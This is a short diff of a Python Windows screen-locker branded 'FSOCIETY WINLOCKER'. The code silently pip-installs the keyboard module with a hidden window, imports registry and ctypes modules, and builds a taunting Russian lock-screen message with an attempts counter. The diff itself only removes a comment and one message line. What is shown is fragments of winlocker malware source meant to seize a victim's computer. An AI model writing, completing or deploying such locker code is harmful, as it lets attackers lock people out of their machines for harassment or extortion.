@@ -1,6 +1,5 @@
 import os, sys, time, threading, ctypes, winreg, shutil, subprocess, tkinter as tk
 
-# Автоустановка keyboard
 try: import keyboard
 except: subprocess.check_call([sys.executable,"-m","pip","install","keyboard"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW); import keyboard
 
@@ -103,7 +102,6 @@ class Locker:
         
         msg = f"""FSOCIETY WINLOCKER
 
-Вот чего доводит интернет.
 Сиди и жуй мой винлокер.
 
 ПОПЫТОК: {TRIES}
